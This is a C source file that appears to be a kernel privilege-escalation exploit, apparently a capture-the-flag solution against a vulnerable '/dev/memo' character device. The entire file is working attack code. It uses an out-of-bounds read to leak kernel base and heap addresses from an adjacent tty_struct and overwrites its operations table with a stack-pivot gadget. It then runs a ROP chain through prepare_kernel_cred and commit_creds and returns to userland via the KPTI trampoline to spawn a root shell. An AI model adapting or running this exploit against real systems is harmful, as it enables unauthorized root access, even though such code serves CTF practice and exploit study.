#define _GNU_SOURCE
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

int open_memo(void) {
    int fd = open("/dev/memo", O_RDWR);
    if (fd < 0 ) {
        puts("Failed to open /dev/memo");
        exit(-1);
    } else {
        puts("[!] Opened device");
    }
    return fd;
}

void get_shell(void) {
    printf("[*] Returned to userland\n");
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve("/bin/sh", argv, envp);
}

int memo_fd, ptmx_fd;
unsigned long user_cs, user_ss, user_sp, user_rflags;           // save state stuffs
unsigned long user_rip = (unsigned long) get_shell;
char buf[0x400];

unsigned long kernel_base, kernel_heap;
unsigned long offset_ptm_unix98_ops_kernbase = 0xe65900UL;
unsigned long offset_kernheap = 0x438UL;
unsigned long commit_creds = 0x7b8b0UL;
unsigned long prepare_kernel_cred = 0x7bb50UL;
unsigned long swapgs_restore_regs_and_return_to_usermode = 0xa00a2fUL;  // kpti trampoline
unsigned long gadget = 0x94d4e3UL;                       // push r12 ; add dword ptr [rbp + 0x41], ebx ; pop rsp ; pop r13 ; ret
unsigned long pop_rdi = 0x1268UL;
unsigned long mov_rdi_rax_rep = 0x19dcbUL;               // mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
unsigned long pop_rcx = 0x4c852UL;

void save_state(void) {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"              // move value of register cs to variable user_cs 
        "mov user_ss, ss;"              // move value of register ss to variable user_ss
        "mov user_sp, rsp;"             // move value of register rsp to variable user_sp
        "pushf;"                        // push flags onto stack (16 bit) 
        "pop user_rflags;"              // pop flags to variable user_rflags
        ".att_syntax;"
    );
    printf("[*] Saved state\n");
}

void leak(void) {
    ptmx_fd = open("/dev/ptmx",O_RDWR | O_NOCTTY);

    // set f_pos to 0x300 
    lseek(memo_fd,0x300,SEEK_SET);
    // f_pos is now at 0x300 and MAXSIZE = 0x400, if read 0x400 we can leak 0x300 bytes
    read(memo_fd,buf,0x400);
    
    // buf + 0x100 to reach the end of memo chunk, 0x18 is offset to const struct tty_operations *ops of tty_struct which is right behind memo chunk in kernel heap 0x400
    kernel_base = *(unsigned long*)(buf + 0x100 + 0x18) - offset_ptm_unix98_ops_kernbase;
    // 0x38 is offset to struct list_head
    kernel_heap = *(unsigned long*)(buf + 0x100 + 0x38) - offset_kernheap;
    pop_rdi += kernel_base;
    prepare_kernel_cred += kernel_base;
    commit_creds += kernel_base;
    swapgs_restore_regs_and_return_to_usermode += kernel_base;
    gadget += kernel_base;
    mov_rdi_rax_rep += kernel_base;
    pop_rcx += kernel_base;
    printf("[*] kernel base: 0x%lx\n",kernel_base);
    printf("[*] kernel heap: 0x%lx\n",kernel_heap);
    printf("[*] prepare_kernel_cred: 0x%lx\n",prepare_kernel_cred);
    printf("[*] commit_creds: 0x%lx\n", commit_creds);
    printf("[*] swapgs_restore_regs_and_return_to_usermode: 0x%lx\n", swapgs_restore_regs_and_return_to_usermode);
    printf("[*] pop_rdi: 0x%lx\n", pop_rdi);
    printf("[*] mov_rdi_rax_rep: 0x%lx\n", mov_rdi_rax_rep);
    printf("[*] pop_rcx: 0x%lx\n", pop_rcx);
    printf("[*] push r12 ; add dword ptr [rbp + 0x41], ebx ; pop rsp ; pop r13 ; ret: 0x%lx\n", gadget);
    getchar();
}

void build_rop(void) {

    printf("[*] rop stage\n");
    // fake ioctl entry in ptm_unix98_ops
    * (unsigned long *) (buf + 0xc*8) = gadget;                     // craft a fake ptm_unix98_ops with pty_unix98_ioctl = gadget => control rip when we call ioctl
    * (unsigned long *) (buf + 0x100 + 0x18) = kernel_heap + 0x300;               // fake vtable
    
    lseek(memo_fd, 0x300, SEEK_SET);
    write(memo_fd, buf, 0x400);     // overwrite ptm_unix98_ops and ioctl entry

    int count = 0;
    unsigned long rop[0x100 / sizeof(unsigned)];
    rop[count++] = pop_rdi;
    rop[count++] = 0x0;
    rop[count++] = prepare_kernel_cred;
    rop[count++] = pop_rcx;
    rop[count++] = 0x0;
    rop[count++] = mov_rdi_rax_rep;
    rop[count++] = commit_creds;
    rop[count++] = swapgs_restore_regs_and_return_to_usermode + 22;
    rop[count++] = 0x0;
    rop[count++] = 0x0;
    rop[count++] = (unsigned long) get_shell;
    rop[count++] = user_cs;
    rop[count++] = user_rflags;
    rop[count++] = user_sp;
    rop[count++] = user_ss;

    // write rop chain
    lseek(memo_fd, 0x0, SEEK_SET);
    write(memo_fd, rop, 0x100);

    // trigger rop chain
    getchar();
    ioctl(ptmx_fd, 0xdeadbeef, kernel_heap-0x8);

    printf("[!] end of build_rop()\n");
}

int main(void)
{
    memo_fd = open_memo();
    save_state();
    leak();
    build_rop();
    return 0;
}